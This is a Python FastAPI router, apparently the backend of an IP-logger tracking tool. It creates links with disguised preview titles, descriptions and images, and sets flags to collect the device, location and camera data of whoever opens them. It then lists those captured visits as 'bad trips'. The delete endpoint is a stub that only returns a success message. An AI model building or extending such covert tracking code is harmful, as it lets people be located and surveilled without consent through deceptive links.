from fastapi import APIRouter, Depends, HTTPException, status
from sqlalchemy.ext.asyncio import AsyncSession
from sqlalchemy import insert, select
from models import User, IPLogger, BadTrip
from pydantic_models import iploggerCreate
from database import get_db
from functions import *

router = APIRouter()

@router.post("/start_session")
async def start_session(db:  AsyncSession = Depends(get_db)):
    user_id = user_id_gen()
    try:
        query = insert(User).values(id=user_id)
        await db.execute(query)
        await db.commit()
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Error starting session, {e}",
        )
    else:
        return {"message": "Session started successfully", "session": encode_b64(user_id)}
    

@router.post("/create_iplogger")
async def create_iplogger(iploggerData: iploggerCreate, db: AsyncSession = Depends(get_db)):
    try:
        iplogger = IPLogger(
            id = iplogger_id_gen(),
            user_id = decode_b64(iploggerData.user_id),
            template = iploggerData.template,
            title_preview = iploggerData.title_preview,
            description_preview = iploggerData.description_preview,
            image_preview = iploggerData.image_preview,
            device_data = iploggerData.device_data,
            location_data = iploggerData.location_data,
            cam_data = iploggerData.cam_data
        )

        query = db.add(iplogger)
        await db.commit()
        await db.refresh(iplogger)
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Error creating IP logger, {e}",
        )
    else:
        return {"message": "IP logger created successfully", "iplogger": iplogger.id}



@router.get("/get_badtrips")
async def get_badtrips(user_id: str, db: AsyncSession = Depends(get_db)):
    try:
        query = select(BadTrip).where(BadTrip.user_id == decode_b64(user_id)).order_by(BadTrip.created_at.desc())
        result = await db.execute(query)
        badtrips = result.scalars().all()
    except Exception as e:
        raise HTTPException(
            status_code=status.HTTP_500_INTERNAL_SERVER_ERROR,
            detail=f"Error fetching bad trips, {e}",
        )
    else:
        return {"message": "Bad trips fetched successfully", "badtrips": badtrips}


@router.delete("/delete_iplogger")
async def delete_iplogger():
    return {"message": "IP logger deleted successfully"}

